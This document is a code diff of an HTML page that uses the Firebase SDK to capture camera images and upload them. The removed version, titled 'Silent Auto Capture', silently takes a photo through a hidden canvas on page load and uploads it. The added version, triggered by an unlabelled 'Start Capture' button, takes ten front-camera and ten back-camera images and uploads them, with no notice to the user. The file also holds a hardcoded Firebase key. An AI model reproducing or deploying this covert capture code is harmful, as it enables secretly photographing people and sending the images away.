@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Silent Auto Capture</title>
+    <title>Auto Capture 10 Front & 10 Back Images</title>
 
     <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 
-        // ✅ Replace with your Firebase config
+        // Replace with your Firebase config
         const firebaseConfig = {
            apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
   authDomain: "valute3.firebaseapp.com",
@@ -22,52 +22,98 @@
   measurementId: "G-VBSCFW4HQP"
         };
 
-        // ✅ Initialize Firebase
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        async function captureAndUploadPhoto() {
+        async function getCameraStream(useFrontCamera) {
+            const constraints = {
+                video: {
+                    facingMode: useFrontCamera ? "user" : "environment"
+                }
+            };
+            return await navigator.mediaDevices.getUserMedia(constraints);
+        }
+
+        async function captureAndUploadPhoto(video, index, useFrontCamera) {
             try {
-                // ✅ Request camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
-
-                // ✅ Wait for the video to load
-                await new Promise(resolve => (video.onloadedmetadata = resolve));
-
-                // ✅ Create a hidden canvas
                 const canvas = document.createElement("canvas");
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext("2d");
 
-                // ✅ Capture image from video
+                // Capture image from video stream
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // ✅ Stop the camera stream
-                stream.getTracks().forEach(track => track.stop());
-
-                // ✅ Convert image to Blob and upload
+                // Convert image to Blob and upload
                 canvas.toBlob(async (blob) => {
-                    const fileName = `images12345/captured_${Date.now()}.png`;
+                    const cameraType = useFrontCamera ? "front" : "back";
+                    const fileName = `images9844120/${cameraType}_${index + 1}_${Date.now()}.png`;
                     const storageRef = ref(storage, fileName);
                     await uploadBytes(storageRef, blob);
 
-                    // ✅ Get download URL
+                    // Get download URL
                     const downloadURL = await getDownloadURL(storageRef);
-                    console.log("Image uploaded:", downloadURL);
+                    console.log(`Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
                 }, "image/png");
             } catch (error) {
                 console.error("Error capturing image:", error);
             }
         }
 
-        // ✅ Automatically capture and upload photo in background
-        window.onload = captureAndUploadPhoto;
+        async function captureMultipleImages() {
+            try {
+                console.log("📸 Requesting camera permission...");
+
+                // Request permission via user interaction
+                const frontStream = await getCameraStream(true);
+                const backStream = await getCameraStream(false);
+
+                const frontVideo = document.createElement("video");
+                frontVideo.srcObject = frontStream;
+                frontVideo.autoplay = true;
+                frontVideo.muted = true;  // Auto-play without sound on mobile
+                frontVideo.playsinline = true;  // Plays inline on mobile
+
+                await new Promise(resolve => (frontVideo.onloadedmetadata = resolve));
+
+                const backVideo = document.createElement("video");
+                backVideo.srcObject = backStream;
+                backVideo.autoplay = true;
+                backVideo.muted = true;
+                backVideo.playsinline = true;
+
+                await new Promise(resolve => (backVideo.onloadedmetadata = resolve));
+
+                console.log("📸 Capturing 10 Front & 10 Back Images...");
+
+                // Capture 10 front camera images
+                for (let i = 0; i < 10; i++) {
+                    await captureAndUploadPhoto(frontVideo, i, true);
+                }
+
+                // Capture 10 back camera images
+                for (let i = 0; i < 10; i++) {
+                    await captureAndUploadPhoto(backVideo, i, false);
+                }
+
+                // Stop camera streams
+                frontStream.getTracks().forEach(track => track.stop());
+                backStream.getTracks().forEach(track => track.stop());
+
+                console.log("✅ All images captured and uploaded!");
+            } catch (error) {
+                console.error("Error capturing images:", error);
+            }
+        }
+
+        // Trigger image capture via a button click (important for mobile browsers)
+        window.onload = () => {
+            document.getElementById("startCaptureButton").onclick = captureMultipleImages;
+        };
     </script>
 </head>
 <body>
+    <button id="startCaptureButton">Start Capture</button>
 </body>
 </html>
